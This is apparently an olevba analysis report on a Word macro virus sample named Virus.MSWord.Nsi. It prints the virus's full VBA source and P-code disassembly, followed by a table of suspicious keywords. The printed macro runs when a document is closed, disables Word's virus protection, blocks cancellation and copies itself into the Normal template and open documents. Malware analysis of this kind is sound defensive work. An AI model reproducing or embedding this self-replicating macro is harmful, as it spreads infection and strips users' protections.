olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Nsi
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Nsi - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
    On Error Resume Next
    Options.VirusProtection = False
    EnableCancelKey = wdCancelDisabled
    Set maci = MacroContainer.VBProject.VBComponents.Item(1)
    Set macic = maci.codemodule
    ns$ = Left(macic.lines(1, 1), 21)
    Set inf = NormalTemplate: nsi$ = ns$ + "Close()"
        If MacroContainer = inf Then Set inf = ActiveDocument: nsi$ = ns$ + "Open()"
    Set infc = inf.VBProject.VBComponents
    Set infi = infc.Item(1)
    Set infic = infi.codemodule
    infi.Name = "ThisDocument"
    For mx = 2 To infc.Count
        infc.Remove infc.Item(2)
    Next mx
        If infic.countlines <> macic.countoflines Then
            infic.deletelines 1, infic.countoflines
            For coco = 1 To macic.countoflines
                infic.insertlines coco, macic.lines(coco, 1)
            Next coco
            infic.replaceline 1, nsi$
        End If
    If Left(ActiveDocument.Name, 8) <> Mid$(macic.lines(1, 1), 13, 8) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    EnableCancelKey = wdCancelDisabled
End Sub
'ThisDocument v 1.0 1999

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Nsi
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4362 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #3:
' 	Ld wdCancelDisabled 
' 	St EnableCancelKey 
' Line #4:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set maci 
' Line #5:
' 	SetStmt 
' 	Ld maci 
' 	MemLd codemodule 
' 	Set macic 
' Line #6:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld macic 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x0015 
' 	ArgsLd LBound 0x0002 
' 	St ns$ 
' Line #7:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set inf 
' 	BoS 0x0000 
' 	Ld ns$ 
' 	LitStr 0x0007 "Close()"
' 	Add 
' 	St nsi$ 
' Line #8:
' 	Ld MacroContainer 
' 	Ld inf 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set inf 
' 	BoS 0x0000 
' 	Ld ns$ 
' 	LitStr 0x0006 "Open()"
' 	Add 
' 	St nsi$ 
' 	EndIf 
' Line #9:
' 	SetStmt 
' 	Ld inf 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set infc 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld infc 
' 	ArgsMemLd Item 0x0001 
' 	Set infi 
' Line #11:
' 	SetStmt 
' 	Ld infi 
' 	MemLd codemodule 
' 	Set infic 
' Line #12:
' 	LitStr 0x000C "ThisDocument"
' 	Ld infi 
' 	MemSt New 
' Line #13:
' 	StartForVariable 
' 	Ld mx 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld infc 
' 	MemLd Count 
' 	For 
' Line #14:
' 	LitDI2 0x0002 
' 	Ld infc 
' 	ArgsMemLd Item 0x0001 
' 	Ld infc 
' 	ArgsMemCall Remove 0x0001 
' Line #15:
' 	StartForVariable 
' 	Ld mx 
' 	EndForVariable 
' 	NextVar 
' Line #16:
' 	Ld infic 
' 	MemLd countlines 
' 	Ld macic 
' 	MemLd countoflines 
' 	Ne 
' 	IfBlock 
' Line #17:
' 	LitDI2 0x0001 
' 	Ld infic 
' 	MemLd countoflines 
' 	Ld infic 
' 	ArgsMemCall deletelines 0x0002 
' Line #18:
' 	StartForVariable 
' 	Ld coco 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld macic 
' 	MemLd countoflines 
' 	For 
' Line #19:
' 	Ld coco 
' 	Ld coco 
' 	LitDI2 0x0001 
' 	Ld macic 
' 	ArgsMemLd lines 0x0002 
' 	Ld infic 
' 	ArgsMemCall insertlines 0x0002 
' Line #20:
' 	StartForVariable 
' 	Ld coco 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	LitDI2 0x0001 
' 	Ld nsi$ 
' 	Ld infic 
' 	ArgsMemCall replaceline 0x0002 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld macic 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x000D 
' 	LitDI2 0x0008 
' 	ArgsLd Mid$$ 0x0003 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #24:
' 	Ld wdCancelDisabled 
' 	St EnableCancelKey 
' Line #25:
' 	EndSub 
' Line #26:
' 	QuoteRem 0x0000 0x0017 "ThisDocument v 1.0 1999"
' Line #27:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

